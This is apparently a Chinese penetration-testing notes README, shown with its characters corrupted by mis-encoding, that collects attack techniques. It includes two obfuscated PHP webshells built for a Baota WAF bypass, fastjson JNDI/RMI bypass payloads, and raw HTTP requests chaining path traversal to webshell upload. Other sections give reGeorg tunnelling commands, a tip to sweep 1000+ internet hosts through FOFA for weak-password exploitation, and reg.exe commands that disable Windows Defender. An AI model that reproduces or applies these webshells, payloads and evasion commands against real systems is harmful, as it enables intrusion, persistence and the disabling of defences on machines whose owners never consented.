### Notes List
- ğŸ´â€â˜  [æ‰“ç‚¹-éšè—èµ„äº§æ¢æµ‹-hostç¢°æ’](https://github.com/pen4uin/Pentest_Notes/blob/main/README.md#%E9%9A%90%E8%97%8F%E8%B5%84%E4%BA%A7%E6%8E%A2%E6%B5%8B-host%E7%A2%B0%E6%92%9E)
- ğŸ´â€â˜  ["ç™»å½•æ¡†" æ”»å‡»é¢](https://github.com/pen4uin/Pentest_Notes/blob/main/README.md#%E7%99%BB%E5%BD%95%E6%A1%86-%E6%94%BB%E5%87%BB%E9%9D%A2)
- ğŸ´â€â˜  [å®å¡”é˜²ç«å¢™ Bypass](https://github.com/pen4uin/Pentest_Notes/blob/main/README.md#%E5%AE%9D%E5%A1%94%E9%98%B2%E7%81%AB%E5%A2%99-bypass)
- ğŸ´â€â˜  [fastjson bypass æŸWAF](https://github.com/pen4uin/Pentest_Notes/blob/main/README.md#fastjson-bypass-%E6%9F%90waf)
- ğŸ´â€â˜  [å†…ç½‘-ä»£ç†(reGeorg+Proxifier+Win)](https://github.com/pen4uin/Pentest_Notes/blob/main/README.md#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%BB%A3%E7%90%86regeorgproxifierwin)
- ğŸ´â€â˜  [å†…ç½‘-ä»£ç†(reGeorg+proxychains+Linux)](https://github.com/pen4uin/Pentest_Notes/blob/main/README.md#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%BB%A3%E7%90%86regeorgproxychainslinux))
- ğŸ´â€â˜  [å†…ç½‘-ä»£ç†(ssocksåå‘ä»£ç†)](https://github.com/pen4uin/Pentest_Notes/blob/main/README.md#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%BB%A3%E7%90%86regeorgproxychainslinux))
- ğŸ´â€â˜  [æ‰“ç‚¹-Druidæœªæˆæƒè®¿é—®->RCE](https://github.com/pen4uin/Pentest_Notes/blob/main/README.md#druid%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-rce)
- ğŸ´â€â˜  [æ‰“ç‚¹-ä»»æ„æ–‡ä»¶ä¸‹è½½->RCE](https://github.com/pen4uin/Pentest_Notes/blob/main/README.md#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-rce)
- ğŸ´â€â˜  [pocsuite3ä»£ç†ä½¿ç”¨](https://github.com/pen4uin/Pentest_Notes/blob/main/README.md#pocsuite3%E4%BB%A3%E7%90%86%E9%A3%9F%E7%94%A8)
- ğŸ´â€â˜  [æ‰“ç‚¹-å­åŸŸåçˆ†ç ´-æ³›è§£æé—®é¢˜](https://github.com/pen4uin/Pentest_Notes/blob/main/README.md#%E5%AD%90%E5%9F%9F%E5%90%8D%E7%88%86%E7%A0%B4-%E6%B3%9B%E8%A7%A3%E6%9E%90%E9%97%AE%E9%A2%98)
- ğŸ´â€â˜  ["SQLæ³¨å…¥" æ”»å‡»é¢](https://github.com/pen4uin/Pentest_Notes/blob/main/README.md#sql%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E9%9D%A2)
- ğŸ´â€â˜  ["æ–‡ä»¶åˆ é™¤" æ”»å‡»é¢](https://github.com/pen4uin/Pentest_Notes/blob/main/README.md#%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%94%BB%E5%87%BB%E9%9D%A2)
- ğŸ´â€â˜  ["Java SSRF" æ”»å‡»é¢](https://github.com/pen4uin/Pentest_Notes/blob/main/README.md#java-ssrf%E6%94%BB%E5%87%BB%E9%9D%A2)
- ğŸ´â€â˜  [é»‘ç›’-æ¼æ´æŒ–æ˜(å¼±å£ä»¤->ä»»æ„æ–‡ä»¶ä¸‹è½½->RCE)](https://github.com/pen4uin/Pentest_Notes/blob/main/README.md#%E9%BB%91%E7%9B%92-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-rce)
- ğŸ´â€â˜  [æ‰“ç‚¹-ThinkPHP 5.0.X(debugæ¨¡å¼+ç©ºæ•°ç»„)](https://github.com/pen4uin/Pentest_Notes#thinkphp-50xdebug%E6%A8%A1%E5%BC%8F%E7%A9%BA%E6%95%B0%E7%BB%84)
- ğŸ´â€â˜  [å†…ç½‘-CMDè·å–RDPç«¯å£](https://github.com/pen4uin/Pentest_Notes#%E5%86%85%E7%BD%91-cmd%E8%8E%B7%E5%8F%96rdp%E7%AB%AF%E5%8F%A3)
- ğŸ´â€â˜  [å†…ç½‘-è§„é¿æ€è½¯ Windows Defender](https://github.com/pen4uin/Pentest_Notes/blob/main/README.md#%E5%86%85%E7%BD%91-%E8%A7%84%E9%81%BF%E6%9D%80%E8%BD%AF-windows-defender)
- ğŸ´â€â˜  [æ‰“ç‚¹-æ–‡ä»¶ä¸‹è½½-mlocate.db](https://github.com/pen4uin/Pentest_Notes/blob/main/README.md#%E6%89%93%E7%82%B9-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-mlocatedb)
- ğŸ´â€â˜  [å†…ç½‘-CMDè·å–WIFIå¯†ç ](https://github.com/pen4uin/Pentest_Notes/blob/main/README.md#%E5%86%85%E7%BD%91-cmd%E8%8E%B7%E5%8F%96wifi%E5%AF%86%E7%A0%81)
- ğŸ´â€â˜  [å†…ç½‘-DMZåŒºçªç ´](https://github.com/pen4uin/Pentest_Notes/blob/main/README.md#%E5%86%85%E7%BD%91-dmz%E5%8C%BA%E7%AA%81%E7%A0%B4)
- ğŸ´â€â˜  [å†…ç½‘-PowerShellå‘½ä»¤å†å²è®°å½•](https://github.com/pen4uin/Pentest_Notes/blob/main/README.md#%E5%86%85%E7%BD%91-powershell%E5%91%BD%E4%BB%A4%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95)
- ğŸ´â€â˜  [å†…ç½‘-å®šä½å¤šç½‘å¡ä¸»æœº](https://github.com/pen4uin/Pentest_Notes/blob/main/README.md#%E5%86%85%E7%BD%91-%E5%AE%9A%E4%BD%8D%E5%A4%9A%E7%BD%91%E5%8D%A1%E4%B8%BB%E6%9C%BAoxid-resolver) 
- ğŸ´â€â˜  [å†…ç½‘-ä¸»æœº"ä¸å‡ºç½‘"](https://github.com/pen4uin/Pentest_Notes/)
- ğŸ´â€â˜  [å†…ç½‘-è·¨åŸŸ](https://github.com/pen4uin/Pentest_Notes/)
- ğŸ´â€â˜  [æ‰“ç‚¹-Confluence RCEåˆ©ç”¨](https://github.com/pen4uin/Pentest_Notes/blob/main/README.md#%E6%89%93%E7%82%B9-confluence-rce%E5%88%A9%E7%94%A8)
- ğŸ´â€â˜  [æ‰“ç‚¹-æ–‡ä»¶ä¸‹è½½-.netç¯å¢ƒ](https://github.com/pen4uin/Pentest_Notes/blob/main/README.md#%E6%89%93%E7%82%B9-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-net%E7%8E%AF%E5%A2%83)
- ğŸ´â€â˜  [å†…ç½‘-vSphere & vCenterçš„ååˆ©ç”¨å§¿åŠ¿](https://github.com/pen4uin/Pentest_Notes/blob/main/README.md#%E5%86%85%E7%BD%91-vsphere--vcenter%E7%9A%84%E5%90%8E%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF)
- ğŸ´â€â˜  [é’“é±¼-é‚®ç®±æ¢é’ˆ](https://github.com/pen4uin/Pentest_Notes/blob/main/README.md#%E9%92%93%E9%B1%BC-%E9%82%AE%E7%AE%B1%E6%8E%A2%E9%92%88)
- ğŸ´â€â˜  [å†…ç½‘-Citrixçš„åæ¸—é€æ€è·¯](https://github.com/pen4uin/Pentest_Notes/blob/main/README.md#%E5%86%85%E7%BD%91-Citrix%E7%9A%84%E5%90%8E%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF)
- ğŸ´â€â˜  [æ‰“ç‚¹-Confluenceååˆ©ç”¨æ€è·¯](https://github.com/pen4uin/Pentest_Notes/blob/main/README.md#%E6%89%93%E7%82%B9-Confluence%E5%90%8E%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF)
- ğŸ´â€â˜  [åŸºå»º-å…³äºå­¦ä¹ RFCè§„èŒƒçš„å¿…è¦æ€§](https://github.com/pen4uin/Pentest_Notes/blob/main/README.md#%E5%9F%BA%E5%BB%BA-%E5%85%B3%E4%BA%8E%E5%AD%A6%E4%B9%A0RFC%E8%A7%84%E8%8C%83%E7%9A%84%E5%BF%85%E8%A6%81%E6%80%A7) 
- ğŸ´â€â˜  [åŸºå»º-è´Ÿè½½å‡è¡¡åœºæ™¯ä¸‹çš„æ¸—é€](https://github.com/pen4uin/Pentest_Notes/blob/main/README.md#%E5%9F%BA%E5%BB%BA-%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84%E6%B8%97%E9%80%8F)
- ğŸ´â€â˜  [äº‘å®‰å…¨-K8Såœºæ™¯ä¸‹çš„æ¸—é€](https://github.com/pen4uin/Pentest_Notes/blob/main/README.md#%E4%BA%91%E5%AE%89%E5%85%A8-k8s%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84%E6%B8%97%E9%80%8F)
- ğŸ´â€â˜  [ä¿¡æ¯æ”¶é›†-FoFaè·å–é—­æºè½¯ä»¶æºç ](https://github.com/pen4uin/Pentest_Notes/blob/main/README.md#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-FoFa%E8%8E%B7%E5%8F%96%E9%97%AD%E6%BA%90%E8%BD%AF%E4%BB%B6%E6%BA%90%E7%A0%81)
- ğŸ´â€â˜  [æ‰“ç‚¹-æ–‡ä»¶å†™å…¥->RCE çš„è·¯å¾„](https://github.com/pen4uin/Pentest_Notes/blob/main/README.md#%E6%89%93%E7%82%B9-%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5-rce-%E7%9A%84%E8%B7%AF%E5%BE%84)
- ğŸ´â€â˜  [å†…ç½‘-Microsoft ATA è§„é¿](https://github.com/pen4uin/Pentest_Notes/blob/main/README.md#%E5%86%85%E7%BD%91-microsoft-ata-%E8%A7%84%E9%81%BF)
- ğŸ´â€â˜  [æ‰“ç‚¹-SQLi+æ—ç«™XSS->RCE](https://github.com/pen4uin/awesome-pentest-note/blob/main/README.md#%E6%89%93%E7%82%B9-sqli%E6%97%81%E7%AB%99xss-rce)
- ğŸ´â€â˜  [æ‰“ç‚¹-æ–‡ä»¶ä¸‹è½½/è¯»å–-mysql ibdata1](https://github.com/pen4uin/awesome-pentest-note/blob/main/README.md#%E6%89%93%E7%82%B9-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96-mysql-ibdata1)

### éšè—èµ„äº§æ¢æµ‹-hostç¢°æ’

step1: æœé›†å­åŸŸå 

step2: æœé›†IP (ç›®æ ‡åŸŸåå†å²è§£æIP)

step3: ä»¥IP+åŸŸåçš„å½¢å¼è¿›è¡Œç¢°æ’


ä¼ é€ï¼š
```
https://github.com/fofapro/Hosts_scan 
https://github.com/shmilylty/OneForAll  
https://fofa.so/
https://site.ip138.com/
https://ipchaxun.com/
https://securitytrails.com/list/apex_domain/  # å­åŸŸå
```
å‚è€ƒï¼š
```
https://www.cnblogs.com/Rain99-/p/13756032.html
https://xz.aliyun.com/t/9590
```
`å¤ç°ï¼š`

**ç¯å¢ƒæ­å»º**

å®éªŒç¯å¢ƒ
```shell
# å®‰è£…nginx
apt install nginx
# åˆ›å»ºnginxé…ç½®æ–‡ä»¶
/usr/sbin/nginx -t
# é…ç½®æ–‡ä»¶ä½ç½®
/etc/nginx/nginx.conf
```

å®æˆ˜ç¯å¢ƒ(æ¨¡æ‹Ÿ)

- åä»£
- é™åˆ¶IPè®¿é—®

æ–‡ä»¶nginx.confé…ç½®å¦‚ä¸‹

```
http {
	##
	# Virtual Host Configs
	##

	include /etc/nginx/conf.d/*.conf;
	# include /etc/nginx/sites-enabled/*;
	# é™åˆ¶IPè®¿é—®
	server {
		listen 80 default;
		server_name _;
		return 403;
		}
	server {
        	listen       80;
        	server_name  nginx.lab.com;
		location / {
        	    proxy_pass http://10.10.10.12:8000;
        	    index  index.html index.htm index.jsp;
        	}
    	}
}
```

**å¤ç°æ•ˆæœ**

å¦‚ä¸‹å›¾æ‰€ç¤º

- IPè®¿é—®
![image](https://user-images.githubusercontent.com/55024146/147384847-4bb7cee1-22c3-48d1-a00a-803965c147cd.png)

- åŸŸåè®¿é—®

Windows

> \# ä¿®æ”¹ hosts
>
> notepad %windir%\system32\drivers\etc\hosts
>
> \# æ·»åŠ ä»¥ä¸‹ç»‘å®šå…³ç³»
>
> 10.10.10.12 nginx.lab.com

![image](https://user-images.githubusercontent.com/55024146/147384852-75451667-7404-43c7-a052-dcd3649d9912.png)

ä½¿ç”¨Burpsuiteå¤ç°

![image](https://user-images.githubusercontent.com/55024146/147384854-4e8b3ec6-09b1-4dcc-b983-e45f59399575.png)

### "ç™»å½•æ¡†" æ”»å‡»é¢
- ç”¨æˆ·åæšä¸¾
- ç©ºå£ä»¤
- å¼±å£ä»¤
- ç™»å½•è®¤è¯ç»•è¿‡
- æš´åŠ›ç ´è§£
- å›¾å½¢éªŒè¯ç ç»•è¿‡
- çŸ­ä¿¡éªŒè¯ç ç»•è¿‡ï¼ˆæˆ–çˆ†ç ´ï¼‰
- çŸ­ä¿¡è½°ç‚¸ï¼ˆé‡æ”¾ï¼‰
- é‚®ç®±è½°ç‚¸ï¼ˆé‡æ”¾ï¼‰
- å¯†ç æ˜æ–‡ä¼ è¾“
- SQLæ³¨å…¥ï¼ˆä¸‡èƒ½å¯†ç ï¼‰
- ä»»æ„ç”¨æˆ·å¯†ç é‡ç½®
- ç›®å½•éå†
- æ•æ„Ÿä¿¡æ¯æ³„éœ²
- æ¡†æ¶æ¼æ´ï¼ˆshiroï¼‰
- XSS
- JSæ–‡ä»¶

### å®å¡”é˜²ç«å¢™ Bypass
- ä¼ å‚æ–¹å¼ $_COOKIE
- ç¼–ç ç»•è¿‡æµé‡æ£€æµ‹

*3é‡ base64 å¤±è´¥*ï¼ˆä¼¼ä¹æ£€æµ‹äº†å…³é”®å­—â€˜base64â€™ï¼‰
![image](https://user-images.githubusercontent.com/55024146/119949340-5c6fda80-bfcc-11eb-84bb-4d2543af7bea.png)

*3é‡ urlç¼–ç  æˆåŠŸ*

![image](https://user-images.githubusercontent.com/55024146/119950026-08192a80-bfcd-11eb-8197-3d6d695b4681.png)

è´´ä¸¤ä¸ªğŸ(`ä¾µåˆ `)

demo1:
```php
<?php
$p=$_COOKIE;(count($p)==23&&in_array(gettype($p).count($p),$p))?(($p[59]=$p[59].$p[72])&&($p[91]=$p[59]($p[91]))&&($p=$p[91]($p[90],$p[59]($p[31])))&&$p()):$p;
?>
```
demo2:
```php
<?php
$poc ="axsxsxexrxt";
$poc_1 = explode("x", $poc);
$poc_2 = $poc_1[0] . $poc_1[1] . $poc_1[2] . $poc_1[3]. $poc_1[4]. $poc_1[5];
$poc_2(urldecode(urldecode(urldecode($_REQUEST[x]))));
?>
```

### fastjson bypass æŸWAF
demo
```
{{"@type":"java.net.URL","val":"http://.dnslog.cn"}:0
```
![image](https://user-images.githubusercontent.com/55024146/119951579-aeb1fb00-bfce-11eb-87aa-67f3dbbd7fb8.png)

bypass
```
{"@type":\b"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:9999","autoCommit":true}}
```
### å†…ç½‘æ¸—é€-ä»£ç†(reGeorg+Proxifier+Win)

```
# reGeorg
https://github.com/sensepost/reGeorg
# Proxifier
https://pc.qq.com/detail/13/detail_10593.html
```
ä¸Šä¼ å¯¹åº”çš„tunnelæ–‡ä»¶ï¼Œå¦‚å›¾å³å¯

![image](https://user-images.githubusercontent.com/55024146/122792344-aa86ae00-d2ec-11eb-82fd-7b9102a0d501.png)

ç„¶åattack-pc æ‰§è¡Œ
```python
python2 reGeorgSocksProxy.py -u http://192.168.10.211/tunnel.nosocket.php -p 8888
```
proxifieré…ç½®ä»£ç†å¦‚ä¸‹
- 127.0.0.1:8888
- socks5

### å†…ç½‘æ¸—é€-ä»£ç†(reGeorg+proxychains+Linux)
```
# reGeorg
https://github.com/sensepost/reGeorg
# Proxifier
https://pc.qq.com/detail/13/detail_10593.html
```
ä¸Šä¼ å¯¹åº”çš„tunnelæ–‡ä»¶ï¼Œå¦‚å›¾å³å¯

![image](https://user-images.githubusercontent.com/55024146/122792344-aa86ae00-d2ec-11eb-82fd-7b9102a0d501.png)

ç„¶åattack-pc æ‰§è¡Œ
```python
python2 reGeorgSocksProxy.py -u http://192.168.10.211/tunnel.nosocket.php -p 4561
```
proxychainsé…ç½®å¦‚ä¸‹ï¼š
- vim /etc/proxychains.conf

![image](https://user-images.githubusercontent.com/55024146/122793053-56c89480-d2ed-11eb-9d5d-3dbcd204a6d7.png)

demo:
ä½¿ç”¨proxychainsä»£ç†è¿œç¨‹ç™»å½•windows
```
proxychains rdesktop -g 1440x900 172.17.17.7:3389 //-gåé¢ä»£è¡¨è¦ä½¿ç”¨çš„åˆ†è¾¨ç‡
```

### å†…ç½‘æ¸—é€-ä»£ç†(ssocksåå‘ä»£ç†)
```
https://sourceforge.net/projects/ssocks/
```
å‚è€ƒï¼š
https://apt404.github.io/2016/09/12/ssocks/

### Druidæœªæˆæƒè®¿é—®->RCE
- ç›®å½•æ‰«æ  /druid/index.html
- ä¿¡æ¯æ³„éœ²  Session & URI(åå°)
- ä¼ªé€ sessionè¿›å…¥åå°ï¼Œå‘ç°ä¸Šä¼ ç‚¹
```
POST /index HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json; charset=utf-8
X-Requested-With: XMLHttpRequest
Content-Length: 0
Origin: 
Referer: 
Cookie: JSESSIONID=589A43F0FAxxxxxx2A4403C143A77A51
```
- ç»•è¿‡å‰ç«¯jséªŒè¯å®ç°ä»»æ„æ–‡ä»¶ä¸Šä¼ 
### ä»»æ„æ–‡ä»¶ä¸‹è½½->RCE
- å‘ç°1å¤„æ–‡ä»¶ä¸‹è½½çš„åœ°æ–¹
```
GET /download?module=&method=Download&name=test.zip&filepath=doc/test.zip HTTP/1.1
Host: 1.1.1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) 
Accept: text/html,application/xhtml+xml,application/xml
Accept-Encoding: gzip, deflate
```
- burpæŠ“åŒ…ï¼Œæ¢ä¸ºpostè¯·æ±‚å‘ç°å¯ä¸‹è½½ä»»æ„æ–‡ä»¶
```
POST /download HTTP/1.1
Host: 1.1.1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) 
Accept: text/html,application/xhtml+xml,application/xml
Accept-Encoding: gzip, deflate

module=&method=Download&name=test.zip&filepath=../webapps/WEB-INF/web.xml
```
- è¯»å–æ—¥å¿—æ–‡ä»¶åˆ¤æ–­classæ–‡ä»¶çš„ä½ç½®
```
POST /download HTTP/1.1
Host: 1.1.1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/xhtml+xml,application/xml
Accept-Encoding: gzip, deflate

module=&method=Download&name=test.zip&filepath=../logs/catalina.2021-xx-xx.log
```
- ä¸‹è½½classæ–‡ä»¶åˆ†æå®¡è®¡,åœ¨/downloadè·¯ç”±ä¸‹çš„servletå­˜åœ¨ä¸Šä¼ æ–‡ä»¶å’Œæ›´æ–°æ–‡ä»¶çš„æ“ä½œ
  - é¦–å…ˆä¸Šä¼ ä¸€ä¸ªç©ºæ–‡ä»¶åˆ°webç›®å½•
  ```
  POST /download HTTP/1.1
  Host: 1.1.1.1
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) 
  Accept: text/html,application/xhtml+xml,application/xml
  Accept-Encoding: gzip, deflate

  module=&method=upload&txtFile_Name=x.jsp&home=/&filepath=../webapps/
  ```

  - æ›´æ–°æ–‡ä»¶å†…å®¹ä¸ºwebshell
  ```
  POST /download HTTP/1.1
  Host: 1.1.1.1
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) 
  Accept: text/html,application/xhtml+xml,application/xml
  Accept-Encoding: gzip, deflate

  module=&method=updateContent&home=/&filepath=../webapps/x.jsp&content=xxxxxx
  ```
- æˆåŠŸçªç ´ç½‘ç»œè¾¹ç•Œè¿›å…¥å†…ç½‘

### pocsuite3ä»£ç†é£Ÿç”¨
å‘½ä»¤è¡Œï¼š
```shell
python cli.py -r pocs\rce.py -u http://127.0.0.1/ --verify --proxy socks5://1.2.3.4:5678
python cli.py -r pocs\rce.py -u http://127.0.0.1/ --verify --proxy socks4://1.2.3.4:5678
python cli.py -r pocs\rce.py -u http://127.0.0.1/ --verify --proxy http://1.2.3.4:5678
python cli.py -r pocs\rce.py -u http://127.0.0.1/ --verify --proxy https://1.2.3.4:5678
```
proxierï¼š

![image](https://user-images.githubusercontent.com/55024146/125926069-5b29debf-31b2-4642-8f24-aea0d019e3c8.png)

### å­åŸŸåçˆ†ç ´-æ³›è§£æé—®é¢˜
0.æ³›è§£æ
```shell
åŸç†ï¼š
åˆ©ç”¨é€šé…ç¬¦(*)å°†æ‰€æœ‰æŸä¸ªçº§åˆ«çš„åŸŸåè§£æåˆ°åŒä¸€ä¸ªIPåœ°å€ä¸Šã€‚

ä¸¾ä¾‹:
ç°æœ‰åŸŸågithub.com, è®¾ç½®æ³›è§£æåï¼Œæ‰€æœ‰è¯¥åŸŸåä¸‹çš„å­åŸŸaaa.github.com,bbb.aaa.github.coméƒ½ä¼šè¢«è§£æåˆ°å’Œgithub.comç›¸åŒçš„ipåœ°å€ã€‚
```
1.OneForAll:
```shell
è®¿é—®ä¸€ä¸ªéšæœºçš„å¹¶ä¸å­˜åœ¨çš„åŸŸï¼Œé€šè¿‡è¿”å›ç»“æœåˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³›è§£æï¼Œè‹¥å­˜åœ¨æ³›è§£æï¼Œç¨‹åºä¼šä¸æ–­çš„å¾ªç¯äº§ç”ŸéšæœºåŸŸåå‘æœåŠ¡å™¨æŸ¥è¯¢ï¼Œå°†æ¯æ¬¡æŸ¥è¯¢åˆ°çš„IPå’ŒTTLè®°å½•ä¸‹æ¥ï¼Œç›´åˆ°å¤§éƒ¨åˆ†çš„IPåœ°å€å‡ºç°æ¬¡æ•°éƒ½å¤§äºä¸¤æ¬¡ï¼Œåˆ™IPé»‘åå•çš„æ”¶é›†ç»“æŸï¼Œåœ¨å¾—åˆ°äº†IPé»‘åå•ä»¥åï¼Œå°†è‡ªå·±çš„å­—å…¸ä¸­çš„æ¯ä¸€é¡¹å’Œè¦æŒ‡å®šæŸ¥è¯¢çš„åŸŸåè¿›è¡Œæ‹¼æ¥çˆ†ç ´ï¼Œç„¶åæ ¹æ®IPé»‘åå•è¿›è¡Œè¿‡æ»¤ã€‚
```
2.SubdomainBrute

```shell
è¶…è¿‡10ä¸ªåŸŸåæŒ‡å‘åŒä¸€IPï¼Œåˆ™æ­¤åå‘ç°çš„å…¶ä»–æŒ‡å‘è¯¥IPçš„åŸŸåå°†è¢«ä¸¢å¼ƒã€‚
```
3.ç›®å‰æ€è·¯-TTLé»‘åå•
```shell
åœ¨æƒå¨ DNS ä¸­ï¼Œæ³›è§£æè®°å½•çš„ TTL è‚¯å®šæ˜¯ç›¸åŒçš„ï¼Œå¦‚æœå­åŸŸåè®°å½•ç›¸åŒï¼Œä½† TTL ä¸åŒï¼Œé‚£è¿™æ¡è®°å½•å¯ä»¥è¯´è‚¯å®šä¸æ˜¯æ³›è§£æè®°å½•ã€‚
```
å‚è€ƒï¼šhttp://sh3ll.me/

### SQLæ³¨å…¥æ”»å‡»é¢

- ä¸‡èƒ½å¯†ç 
- æ•æ„Ÿä¿¡æ¯  `é‚®ç®±/ç”µè¯ç­‰ -> ä¾›ç¤¾å·¥é’“é±¼ä½¿ç”¨`
- å‡­è¯  `session/å¯†ç ç­‰ -> å¤–ç½‘ç³»ç»Ÿå…¥å£(OA/é‚®ç®±/VPN)`
- RCE
  - mssql xp_cmdshell
  - mysql udf
- Webshell
  - mysql
  - mssql
  - oracle
- SSRF
  - mssql
  - oracle
- ç«¯å£æ‰«æ
  - oracle
- å‡­æ®(NTLM Hash)
  - Windows & UNC 

### æ–‡ä»¶åˆ é™¤æ”»å‡»é¢

- åˆ é™¤install.lockå¯¼è‡´é‡è£…ï¼Œè¿›è€ŒRCE
  -  /sys/install.lock VAuditDemo
- åˆ é™¤æŸäº›é…ç½®æ–‡ä»¶å¯¼è‡´é‡è£…ï¼Œè¿›è€ŒRCE
  -  my.php ç„¶ä¹‹ååŒ
- åˆ é™¤æƒé™æ ¡éªŒæ–‡ä»¶ï¼Œç»„åˆå—é™æ¼æ´(æ–‡ä»¶ä¸Šä¼ /SQLiæ³¨å…¥ç­‰)ï¼Œè¿›è€ŒRCE
  -  /inc/auth.inc.php é€šè¾¾OA
- åˆ é™¤è´¦å·å¯†ç é…ç½®æ–‡ä»¶ï¼Œå¯¼è‡´è´¦å·å¯†ç é‡æ–°é…ç½®ï¼Œè¿›è€Œè·å¾—ç®¡ç†å‘˜æƒé™
  -  /WEB-INF/resources/privilege.xml å¸†è½¯æŠ¥è¡¨ç³»ç»Ÿ(FineReport)
### Java SSRFæ”»å‡»é¢

- åˆ©ç”¨fileåè®®ä»»æ„æ–‡ä»¶è¯»å–
- åˆ©ç”¨httpåè®®ç«¯å£/æœåŠ¡æ¢æµ‹
- åˆ©ç”¨httpåè®®è¿›è¡Œ ntlm relay
- ç»„åˆredisç­‰å†…ç½‘æœåŠ¡ä»è€Œrce(weblogic)

### é»‘ç›’-æ¼æ´æŒ–æ˜(å¼±å£ä»¤->ä»»æ„æ–‡ä»¶ä¸‹è½½->RCE)
- Tip: `fofaéšç¼˜ï¼Œç‹¬ç«‹ip 1000+å³å¯`
![image](https://user-images.githubusercontent.com/55024146/131246806-76084a34-cfa4-454b-ba83-2f17afdc17f5.png)

**step1** 
- æœç´¢äº§å“çš„å®‰è£…æ‰‹å†Œ/ç”¨æˆ·æ‰‹å†Œï¼ˆå¼±å£ä»¤ï¼Œå½±å­è´¦æˆ·ç­‰ï¼‰
- å‘ç°é€šç”¨å¼±å£ä»¤-admin/admin
  ![image](https://user-images.githubusercontent.com/55024146/131246914-bc2a9913-ab8d-44ac-9b36-401e9d47d264.png)

**step2**
- ç™»å½•åå°å¹¶æµ‹è¯•åŠŸèƒ½ç‚¹ï¼ŒburpæŠ“å–æµé‡
- å‘ç°å‚æ•°ï¼š?xmlPath=
  - æ„é€ payload
  ```
  .action?xmlPath=../../conf/tomcat-users.xml
  .action?xmlPath=../../webapps/examples/WEB-INF/web.xml
  ```
- ç»æµ‹è¯•å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´
  ![image](https://user-images.githubusercontent.com/55024146/131247048-5deb0483-ab3a-4394-9711-a3122e466caa.png)

**step3**
- å›æº¯burpçš„ä»£ç†æµé‡
- cookieå‘ç°å‚æ•°:rememberMe
- å°è¯•ç»„åˆä»»æ„æ–‡ä»¶è¯»å–è¿›è¡Œæ¼æ´åˆ©ç”¨
  - web.xml -> shiro.ini(å¤±è´¥)
  - tomcat-users.xml -> æ§åˆ¶å°åˆ©ç”¨æ€è·¯(å¤±è´¥)
- æœ€åè¿˜æ˜¯ä½œä¸ºè„šæœ¬å°å­çš„å¿«ä¹:)
  ![image](https://user-images.githubusercontent.com/55024146/131247374-b65507ba-97c0-48b6-b3d7-8034d74bc8d9.png)

  
### ThinkPHP 5.0.X(Debugæ¨¡å¼+ç©ºæ•°ç»„)
- è‹¥ç›®æ ‡å¯ç”¨äº† debug æ¨¡å¼ï¼Œæ•æ„ŸåŠŸèƒ½ç‚¹ä¼ é€’ç©ºæ•°ç»„å¯èƒ½ä¼šå¼•èµ·ç¨‹åºæŠ›å‡ºå¼‚å¸¸æ³„éœ²æ•æ„Ÿä¿¡æ¯ by xxxeyJ
```http
POST /index/login HTTP/1.1
User-Agent: 
Accept: 
Accept-Encoding: 
Content-Type: 

username=admin&password[]=&verifycode=
```
### å†…ç½‘-CMDè·å–RDPç«¯å£
Terminalä¸‹æ‰§è¡Œ
> REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber

å“åº”
> PortNumber    REG_DWORD    0xd3d 

![image](https://user-images.githubusercontent.com/55024146/132183605-7c089977-c0ef-4fd5-90b7-f0f9d8c8501e.png)

è¿›åˆ¶è½¬æ¢å¾—åˆ°

![image](https://user-images.githubusercontent.com/55024146/132183711-ac078a35-d868-401b-a6ff-7f968a77af01.png)

### å†…ç½‘-è§„é¿æ€è½¯ Windows Defender
```shell
# Defensive Evasion
reg.exe     add "HKLM\Software\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg.exe     add "HKLM\Software\Policies\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 1 /f
reg.exe     add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v MpEnablePus /t REG_DWORD /d 0 /f
reg.exe     add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f
